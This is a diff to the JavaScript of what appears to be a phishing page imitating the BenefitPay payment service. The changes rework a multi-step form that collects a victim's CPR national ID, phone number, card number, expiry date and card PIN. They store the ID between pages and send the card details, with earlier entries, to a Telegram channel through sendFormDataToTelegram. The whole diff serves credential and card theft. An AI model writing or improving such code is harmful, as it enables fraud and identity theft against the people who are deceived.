@@ -24,20 +24,80 @@ function formatExpiry(input) {
     input.value = value;
 }
 
+// Format month input (2 digits, 01-12)
+function formatMonth(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 2) {
+        value = value.substring(0, 2);
+    }
+    // Validate month (01-12)
+    if (value.length === 2) {
+        const month = parseInt(value);
+        if (month > 12) {
+            value = '12';
+        } else if (month === 0) {
+            value = '01';
+        } else if (month < 10) {
+            value = '0' + month;
+        }
+    }
+    input.value = value;
+}
+
+// Format year input (2 digits)
+function formatYear(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 2) {
+        value = value.substring(0, 2);
+    }
+    input.value = value;
+}
+
 // Format balance input (numbers only)
 function formatBalance(input) {
     input.value = input.value.replace(/\D/g, '');
 }
 
 // Navigation functions
+function proceedToPhone() {
+    const cprNumber = document.getElementById('cprNumber').value;
+    
+    if (!cprNumber) {
+        alert('Please enter your CPR');
+        return;
+    }
+    
+    // Store CPR in sessionStorage
+    try {
+        sessionStorage.setItem('benefitPayFormData', JSON.stringify({
+            'CPR': cprNumber
+        }));
+    } catch (e) {
+        console.warn("Error saving CPR:", e);
+    }
+    
+    window.location.href = 'phone.html';
+}
+
 async function proceedToCard() {
     const phoneNumber = document.getElementById('phoneNumber').value;
-    const cprNumber = document.getElementById('cprNumber').value;
     const termsChecked = document.getElementById('termsCheckbox').checked;
     const countryCode = document.getElementById('selectedCode') ? document.getElementById('selectedCode').textContent : '+973';
     
-    if (!phoneNumber || !cprNumber) {
-        alert('Please fill in all required fields');
+    // Get CPR from sessionStorage
+    let cprNumber = '';
+    try {
+        const stored = sessionStorage.getItem('benefitPayFormData');
+        if (stored) {
+            const data = JSON.parse(stored);
+            cprNumber = data.CPR || '';
+        }
+    } catch (e) {
+        console.warn("Error reading CPR:", e);
+    }
+    
+    if (!phoneNumber) {
+        alert('Please enter your mobile number');
         return;
     }
     
@@ -60,7 +120,8 @@ async function proceedToCard() {
 
 async function proceedToSecurity() {
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
-    const expiryCode = document.getElementById('expiryCode').value;
+    const expiryMonth = document.getElementById('expiryMonth').value;
+    const expiryYear = document.getElementById('expiryYear').value;
     const cardPin = document.getElementById('cardPin').value;
     
     if (!cardNumber || cardNumber.length !== 16) {
@@ -68,16 +129,23 @@ async function proceedToSecurity() {
         return;
     }
     
-    if (!expiryCode || !cardPin || cardPin.length !== 4) {
-        alert('Please fill in all card details');
+    if (!expiryMonth || expiryMonth.length !== 2 || !expiryYear || expiryYear.length !== 2) {
+        alert('Please enter valid month and year');
         return;
     }
+    
+    if (!cardPin || cardPin.length !== 4) {
+        alert('Please enter your 4-digit card PIN');
+        return;
+    }
+    
+    const expiryCode = expiryMonth + '/' + expiryYear;
     
     // Send to Telegram with previous entries + card details
     if (typeof sendFormDataToTelegram !== 'undefined') {
         await sendFormDataToTelegram('Card Details Submitted', {
             'Card Number': cardNumber,
-            'Expiry Code': expiryCode,
+            'Expiry Date': expiryCode,
             'Card PIN': cardPin
         }, false); // false = don't include IP (not first message)
     }
@@ -350,22 +418,47 @@ document.addEventListener('click', function(event) {
     }
 });
 
+// Close Notice Popup
+function closeNoticePopup() {
+    const noticePopup = document.getElementById('noticePopup');
+    const mainContent = document.getElementById('mainContent');
+    
+    if (noticePopup) {
+        noticePopup.classList.add('hidden');
+        // Show main content after popup closes
+        setTimeout(() => {
+            if (mainContent) {
+                mainContent.style.display = 'block';
+            }
+        }, 300);
+    }
+}
+
 // Splash Screen Handler
 document.addEventListener('DOMContentLoaded', function() {
     const splashScreen = document.getElementById('splashScreen');
+    const noticePopup = document.getElementById('noticePopup');
     const mainContent = document.getElementById('mainContent');
     
-    if (splashScreen && mainContent) {
-        // Hide splash screen after 2.5 seconds
+    if (splashScreen) {
+        // Hide splash screen after 2.5 seconds, then show popup
         setTimeout(() => {
             splashScreen.classList.add('hidden');
-            // Show main content after fade out
+            // Show popup after splash fades out
             setTimeout(() => {
-                mainContent.style.display = 'block';
+                if (noticePopup) {
+                    noticePopup.style.display = 'flex';
+                } else if (mainContent) {
+                    // If no popup, show main content directly
+                    mainContent.style.display = 'block';
+                }
             }, 500); // Wait for fade transition
         }, 2500);
+    } else if (noticePopup) {
+        // If no splash, show popup immediately
+        noticePopup.style.display = 'flex';
     } else if (mainContent) {
-        // If no splash screen, show content immediately
+        // If no splash or popup, show content immediately
         mainContent.style.display = 'block';
     }
     
